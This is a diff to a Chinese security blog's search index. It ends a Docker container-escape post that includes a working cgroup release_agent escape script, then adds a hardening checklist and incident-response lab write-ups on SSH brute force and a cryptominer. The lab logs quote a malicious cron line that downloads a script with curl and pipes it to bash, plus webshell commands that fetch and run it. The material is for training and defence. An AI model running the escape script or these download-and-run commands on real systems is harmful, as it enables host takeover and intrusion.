@@ -2654,6 +2654,32 @@
 <p>利用脚本：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># HexC2 · escape-release-agent</span><br><span class="line"># https://hexc2.com/</span><br><span class="line"># 用法: nc &lt;IP&gt; &lt;PORT&gt; &lt; escape-release-agent.sh</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 1. 确认身份&quot;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 2. 确认 cgroup v1&quot;</span><br><span class="line">ls /sys/fs/cgroup/ | head -6</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 3. 挂载 freezer 子系统&quot;</span><br><span class="line">mkdir -p /tmp/c</span><br><span class="line">mount -t cgroup -o freezer cgroup /tmp/c 2&gt;/dev/null &amp;&amp; echo &quot;[+] mount ok&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 4. 计算宿主路径&quot;</span><br><span class="line">hp=$(sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab | head -1)</span><br><span class="line">echo &quot;host_path=$hp&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 5. 写 payload&quot;</span><br><span class="line">printf &#x27;#!/bin/sh\ncat /root/flag &gt; %s/output\n&#x27; &quot;$hp&quot; &gt; /payload.sh</span><br><span class="line">chmod +x /payload.sh</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 6. 注册 release_agent&quot;</span><br><span class="line">echo &quot;$hp/payload.sh&quot; &gt; /tmp/c/release_agent</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 7. 触发&quot;</span><br><span class="line">mkdir -p /tmp/c/x</span><br><span class="line">echo 1 &gt; /tmp/c/x/notify_on_release</span><br><span class="line">sh -c &quot;echo \$\$ &gt; /tmp/c/x/cgroup.procs&quot;</span><br><span class="line">sleep 2</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 8. 读取 flag&quot;</span><br><span class="line">cat /output</span><br></pre></td></tr></table></figure>
 
+<h1 id="检查清单"><a href="#检查清单" class="headerlink" title="检查清单"></a>检查清单</h1><p>这五种方法都不依赖内核漏洞，检查配置就能发现大部分问题。下面几条在宿主机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect &lt;容器名&gt; --format &#x27;&#123;&#123;.HostConfig.Privileged&#125;&#125;&#x27;</span><br><span class="line">docker inspect &lt;容器名&gt; --format &#x27;&#123;&#123;.HostConfig.CapAdd&#125;&#125;&#x27;</span><br><span class="line">docker inspect &lt;容器名&gt; --format &#x27;&#123;&#123;json .Mounts&#125;&#125;&#x27;</span><br><span class="line">docker inspect &lt;容器名&gt; --format &#x27;&#123;&#123;.HostConfig.PidMode&#125;&#125; &#123;&#123;.HostConfig.NetworkMode&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>检查项</th>
+<th>要处理的值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Privileged</td>
+<td>输出 true 就改掉</td>
+</tr>
+<tr>
+<td>CapAdd</td>
+<td>出现 SYS_ADMIN、DAC_READ_SEARCH、DAC_OVERRIDE、SYS_PTRACE 时逐项确认</td>
+</tr>
+<tr>
+<td>Mounts</td>
+<td>出现 docker.sock、宿主 &#x2F;root、&#x2F;etc、块设备时收回或改 :ro</td>
+</tr>
+<tr>
+<td>这三项只能发现显式配置。运行时还要看 PidMode 和 NetworkMode：PidMode&#x3D;host 会暴露宿主进程表，NetworkMode&#x3D;host 会让容器直接访问宿主 127.0.0.1 上的服务。</td>
+<td></td>
+</tr>
+</tbody></table>
 <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://mp.weixin.qq.com/s/rO_RrRqRzf2Qz_fYcwN3lw">https://mp.weixin.qq.com/s/rO_RrRqRzf2Qz_fYcwN3lw</a></p>
 <p><a href="https://hexc2.com/wiki/escape-release-agent">https://hexc2.com/wiki/escape-release-agent</a></p>
 ]]></content>
@@ -2663,6 +2689,57 @@
       <tags>
         <tag>docker</tag>
         <tag>逃逸</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应靶场练习</title>
+    <url>/2026/11/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="SSH-暴力破解与后门账号"><a href="#SSH-暴力破解与后门账号" class="headerlink" title="SSH 暴力破解与后门账号"></a>SSH 暴力破解与后门账号</h1><p>运维说「SSH 有点卡」。auth.log 里 214 条失败，一条成功，后面跟着五条 sudo。</p>
+<h2 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h2><p>现场<br>内部运维平台 web02，只跑一个状态面板，业务很轻。</p>
+<p>运维组长提了一句：最近 SSH 连上去有点卡，是不是网络问题。</p>
+<p>你拿到这台机器的 root，可以从终端里翻。</p>
+<p>要找的<br>三个问题：</p>
+<p>有人从外部登进来过吗？是哪个账号<br>从哪个 IP<br>进来之后留了什么<br>日志在 &#x2F;var&#x2F;log&#x2F;auth.log。</p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>执行以下命令找出所有登录成功日志。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/auth.log</span><br></pre></td></tr></table></figure>
+
+<p>日志格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间 主机名 进程[PID]: 消息内容</span><br><span class="line">Nov 22 08:00:10 ubuntu sshd[1234]: Accepted publickey for root from 192.168.1.100 port 54321 ssh2: RSA SHA256:xxxx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>sshd[pid]</code>：ssh 服务事件</li>
+<li><code>sudo[pid]</code>：sudo 提权事件</li>
+<li><code>su[pid]</code>：切换用户</li>
+<li><code>CRON</code>：定时任务执行认证</li>
+<li><code>pam_*</code>：PAM 认证模块输出</li>
+</ul>
+<p>查看所有 sudo 操作记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;sudo&quot; /var/log/auth.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="找出flag"><a href="#找出flag" class="headerlink" title="找出flag"></a>找出flag</h2><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261122081944940.png" alt="image-20261122081944940"></p>
+<p>有人从外部登进来过吗？是哪个账号：deploy<br>从哪个 IP：45.13.208.77<br>进来之后留了什么：backup</p>
+<h1 id="Web-服务器被植入挖矿"><a href="#Web-服务器被植入挖矿" class="headerlink" title="Web 服务器被植入挖矿"></a>Web 服务器被植入挖矿</h1><h2 id="靶场说明-1"><a href="#靶场说明-1" class="headerlink" title="靶场说明"></a>靶场说明</h2><p>现场<br>一台对外提供官网的 Nginx 服务器，跑了三年没大修过。</p>
+<p>运维在值班群里报了一句：CPU 一直 100%，网站打开很慢，重启过一次，第二天又慢了。</p>
+<p>你手上只有这台机器的 SSH。</p>
+<p>要找的<br>三个问题，对应三个 flag：</p>
+<p>挖矿程序的可执行文件在哪<br>它连的矿池地址是什么<br>攻击者用什么方式让它每次重启都能活下来<br>提醒<br>先别急着 kill。杀掉进程只是让它停一会儿，找到它怎么进来的、怎么活下来的，才算处置完。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>ps 查看占用 cpu 最高的 10 个进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux --sort=-%cpu | head -11</span><br></pre></td></tr></table></figure>
+<p>第一个进程为可疑进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@bad2e0ff63a2:/# ps aux --sort=-%cpu | head -11</span><br><span class="line">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root           7  8.0  0.0   2644  1024 ?        S    00:21   0:15 /tmp/kdevtmpfsi --pool stratum+tcp://pool.minexmr.com:4444 --user 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9uxq3YWrDTsPDbwp5hurKDpWXD28cH4Erigj43</span><br><span class="line">root           1  0.0  0.0  55212 11392 ?        Ss   00:21   0:00 nginx: master process nginx -g daemon off;</span><br><span class="line">root          11  0.0  0.0  17420  4352 ?        Sl   00:21   0:00 ttyd -p 7681 -i 127.0.0.1 bash</span><br><span class="line">www-data      12  0.0  0.0  55520  4464 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      13  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      14  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      15  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      16  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      17  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br><span class="line">www-data      18  0.0  0.0  55520  3440 ?        S    00:21   0:00 nginx: worker process</span><br></pre></td></tr></table></figure>
+<p>查看计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">ls /etc/cron.d/</span><br><span class="line">ls /var/spool/cron/crontabs/</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+<p>输出如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@bad2e0ff63a2:/tmp# cat /var/spool/cron/crontabs/root </span><br><span class="line"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span><br><span class="line"># (/tmp/crontab.XXXX installed on Thu Oct 29 02:15:01 2026)</span><br><span class="line"># (Cron version -- $Id$)</span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"># 业务备份</span><br><span class="line">0 3 * * * /usr/local/bin/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># 更新防护规则</span><br><span class="line">*/30 * * * * /usr/local/bin/refresh_rules.sh &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># 同步时钟</span><br><span class="line">*/10 * * * * /usr/sbin/ntpdate -s ntp.aliyun.com &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">*/5 * * * * curl -s http://45.13.208.77/xmr.sh | bash &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h2><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261122084332101.png" alt="image-20261122084332101"></p>
+<p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261122084354603.png" alt="image-20261122084354603"></p>
+<h2 id="后续分析入侵入口"><a href="#后续分析入侵入口" class="headerlink" title="后续分析入侵入口"></a>后续分析入侵入口</h2><p>执行<code>grep &quot;php&quot;  /var/log/nginx/access.log</code>查看nginx日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">203.0.113.45 - - [29/Oct/2026:02:11:06 +0800] &quot;GET /wp-login.php HTTP/1.1&quot; 404 274 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:11:13 +0800] &quot;GET /phpmyadmin/ HTTP/1.1&quot; 404 505 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:11:19 +0800] &quot;GET /config.php.bak HTTP/1.1&quot; 404 596 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:11:32 +0800] &quot;GET /upload.php HTTP/1.1&quot; 200 203 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:13:22 +0800] &quot;POST /upload.php HTTP/1.1&quot; 200 87 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:13:41 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=id HTTP/1.1&quot; 200 227 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:13:44 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=uname+-a HTTP/1.1&quot; 200 230 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:13:51 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=cat+/etc/passwd HTTP/1.1&quot; 200 214 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:14:05 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=wget+http://45.13.208.77/xmr.sh+-O+/tmp/x.sh HTTP/1.1&quot; 200 120 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:14:09 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=chmod+%2Bx+/tmp/x.sh HTTP/1.1&quot; 200 121 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br><span class="line">203.0.113.45 - - [29/Oct/2026:02:14:22 +0800] &quot;GET /uploads/2026/logo_thumb.php?cmd=bash+/tmp/x.sh HTTP/1.1&quot; 200 64 &quot;-&quot; &quot;curl/8.5.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>大致分析为文件上传漏洞，上传webshell（logo_thumb.php）执行命令。</p>
+]]></content>
+      <tags>
+        <tag>应急响应</tag>
       </tags>
   </entry>
 </search>
